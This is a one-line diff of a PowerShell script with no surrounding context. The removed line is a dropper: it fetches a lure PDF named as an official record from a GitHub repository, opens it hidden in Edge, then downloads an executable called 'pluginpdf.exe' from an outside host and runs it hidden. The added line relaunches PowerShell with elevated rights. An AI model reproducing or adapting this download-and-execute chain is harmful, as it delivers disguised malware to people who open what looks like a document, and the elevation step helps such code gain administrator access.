@@ -1,1 +1,1 @@
-$t=[System.IO.Path]::GetTempPath();$p="$t\Acta_UPTecamac.pdf";$u1="https://github.com/whaomi23/Ex/blob/main/Acta_UPTecamac.pdf?raw=true";try{Invoke-WebRequest -Uri $u1 -OutFile $p -ErrorAction Stop}catch{exit}if(Test-Path $p){Start-Process "msedge.exe" $p -WindowStyle Hidden;$f="$t\pluginpdf.exe";$u2="https://example.com/pluginpdf.exe";try{Invoke-WebRequest -Uri $u2 -OutFile $f -ErrorAction Stop}catch{exit}if(Test-Path $f){Start-Process -FilePath $f -ArgumentList "-run" -WindowStyle Hidden}}
+Start-Process -FilePath "powershell" -Verb RunAs
